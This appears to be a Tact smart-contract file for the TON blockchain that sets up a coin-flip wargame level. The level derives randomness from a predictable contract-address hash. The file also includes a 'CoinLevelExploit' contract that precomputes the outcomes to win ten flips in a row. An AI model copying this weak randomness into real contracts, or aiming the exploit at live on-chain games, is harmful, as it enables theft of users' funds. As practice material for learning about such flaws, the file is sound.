import "@stdlib/deploy";
message Flip {
    side: Bool;
}

contract Contract {
    nonce: Int;
    init(nonce: Int){
        self.nonce = nonce;
    }
}

contract CoinLevel with Deployable {
    player: Address;
    nonce: Int;
    consecutiveWins: Int = 0;
    flipsCount: Int = 0;
    init(player: Address, nonce: Int){
        self.player = player;
        self.nonce = nonce;
    }

    receive(msg: Flip){
        let init: StateInit = initOf Contract(self.flipsCount);
        let contractAddress: Address = contractAddress(init);
        let side = (contractAddress.asSlice().asCell().hash() % 2) == 0;
        self.consecutiveWins = msg.side == side ? self.consecutiveWins + 1 : 0;
        self.flipsCount += 1;
    }

    receive("check"){
        self.consecutiveWins >= 10;
        // send(SendParameters{
        //         to: sender(),
        //         value: 0,
        //         mode: SendRemainingValue,
        //         bounce: false,
        //         body: CheckLevelResult{name: "coin", completed: self.consecutiveWins >= 10}.toCell()
        //     }
        // );
    }

    get fun consecutiveWins(): Int {
        return self.consecutiveWins;
    }

    get fun flipsCount(): Int {
        return self.flipsCount;
    }
}

contract CoinLevelExploit with Deployable {
    target: Address;
    nonce: Int;
    init(target: Address, nonce: Int){
        self.target = target;
        self.nonce = nonce;
    }

    receive("Exploit"){
        let sum: Int = 0;
        let i: Int = 0;
        repeat (10) {
            let init: StateInit = initOf Contract(i);
            let contractAddress: Address = contractAddress(init);
            let side = (contractAddress.asSlice().asCell().hash() % 2) == 0;
            i = i + 1;

            send(SendParameters{to: self.target, value: ton("0.1"), body: Flip{side:side}.toCell()});
        }

        send(SendParameters{to: sender(), bounce: true, value: 0, mode: SendRemainingBalance + SendIgnoreErrors});
    }
}